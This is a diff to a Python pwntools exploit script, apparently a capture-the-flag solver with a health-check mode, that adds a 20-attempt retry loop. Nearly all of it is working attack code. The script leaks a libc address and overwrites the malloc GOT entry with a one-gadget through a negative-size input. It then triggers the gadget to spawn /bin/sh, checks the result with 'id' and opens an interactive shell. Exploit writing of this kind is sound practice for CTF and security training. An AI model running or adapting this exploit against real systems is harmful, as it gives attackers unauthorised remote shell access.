@@ -1,6 +1,9 @@
 #!/usr/bin/env python3
 from pwn import *
 import sys
+import os
+
+NUM_ATTEMPTS = 20
 
 HOST = ''
 PORT = 11526
@@ -22,65 +25,83 @@ if len(sys.argv) > 1:
 if len(sys.argv) > 2:
 	PORT = int(sys.argv[2])
 
-if len(HOST) > 0:
-	target_libc = ELF('../bin/libc.so.6')
-	io = remote(HOST, PORT)
-else:
-	target_libc = target_elf.libc
-	io = target_elf.process()
+def exploit_attempt():
+	try:
+		if len(HOST) > 0:
+			target_libc = ELF('../bin/libc.so.6')
+			io = remote(HOST, PORT, level='warn')
+		else:
+			target_libc = target_elf.libc
+			io = target_elf.process(level='warn')
 
-one_gadgets = get_one_gadgets(target_libc.path)
+		one_gadgets = get_one_gadgets(target_libc.path)
 
-sys.stdout.write(io.recvuntil(b'\n\n'))
-io.recvuntil(b'challenges\n\n')
+		sys.stdout.write(io.recvuntil(b'\n\n'))
+		io.recvuntil(b'challenges\n\n')
 
-# step 1: leak
-io.recvuntil(b'size: ')
-io.sendline(b'4')
+		# step 1: leak
+		io.recvuntil(b'size: ')
+		io.sendline(b'4')
 
-io.recvuntil(b'data: ')
-io.send(b'xxxx\r')
+		io.recvuntil(b'data: ')
+		io.send(b'xxxx\r')
 
-io.recvuntil(b'resp: ')
-io.recvuntil(b'kkkk')
-leak = io.recv(4)
-leak = u32(leak)
-libc = leak - target_libc.symbols['_IO_2_1_stdout_']
-func = libc + random.choice(one_gadgets) # one shot gadget, pick one of them
-bash = next(libc+addr for addr in target_libc.search(b'/bin/sh') if b'\x00' not in p32(libc+addr)) # If system contains null-byte, error out and try again
+		io.recvuntil(b'resp: ')
+		io.recvuntil(b'kkkk')
+		leak = io.recv(4)
+		leak = u32(leak)
+		libc = leak - target_libc.symbols['_IO_2_1_stdout_']
+		func = libc + random.choice(one_gadgets) # one shot gadget, pick one of them
+		bash = next(libc+addr for addr in target_libc.search(b'/bin/sh') if b'\x00' not in p32(libc+addr)) # If system contains null-byte, error out and try again
 
-log.info('leak: %#010x' % leak)
-log.info('libc: %#010x' % libc)
-log.info('func: %#010x' % func)
+		log.info('leak: %#010x' % leak)
+		log.info('libc: %#010x' % libc)
+		log.info('func: %#010x' % func)
 
-io.recvuntil(b'more? (y/n): ')
-io.sendline(b'y')
+		io.recvuntil(b'more? (y/n): ')
+		io.sendline(b'y')
 
-# step 2: write GOT
-io.recvuntil(b'size: ')
-io.sendline(b'-1')
+		# step 2: write GOT
+		io.recvuntil(b'size: ')
+		io.sendline(b'-1')
 
-io.recvuntil(b'data: ')
-io.sendline(p32(func) + b'\x00'*60 + b'\x08' + p32(target_elf.symbols['got.malloc']))
+		io.recvuntil(b'data: ')
+		io.sendline(p32(func) + b'\x00'*60 + b'\x08' + p32(target_elf.symbols['got.malloc']))
 
-io.recvuntil(b'resp: ')
-io.recvline()
+		io.recvuntil(b'resp: ')
+		io.recvline()
 
-io.recvuntil(b'more? (y/n): ')
-io.sendline(b'y')
+		io.recvuntil(b'more? (y/n): ')
+		io.sendline(b'y')
 
-# step 3: trigger
-io.recvuntil(b'size: ')
-io.sendline(b'-' + str(0x100000000 - bash).encode('ascii'))
+		# step 3: trigger
+		io.recvuntil(b'size: ')
+		io.sendline(b'-' + str(0x100000000 - bash).encode('ascii'))
 
-io.recvuntil(b'data: ')
-io.sendline()
+		io.recvuntil(b'data: ')
+		io.sendline()
 
-# step 4: enjoy a nice shell
-io.sendline(b'id')
-id_result = io.recvline()
-if b'uid=' in id_result:
-	log.success('shell: %s', id_result.decode('ascii').strip())
-	io.interactive()
-else:
-	log.failure('error: %s', id_result)
+		# step 4: enjoy a nice shell
+		io.sendline(b'id')
+		id_result = io.recvline()
+		if b'uid=' in id_result:
+			log.success('Shell: %s', id_result.decode('ascii').strip())
+			if not os.environ.get('HEALTH_CHECK', False):
+				io.interactive()
+			return True
+		else:
+			log.failure('Error: %s', id_result)
+	except EOFError as e:
+		log.failure('Fail: EOF')
+	except Exception as e:
+		log.failure('Error: %s: %s', type(e), str(e))
+	finally:
+		io.close()
+	return False
+
+if __name__ == '__main__':
+	for _ in range(NUM_ATTEMPTS):
+		if exploit_attempt():
+			sys.exit(0)
+	sys.exit(1)
+
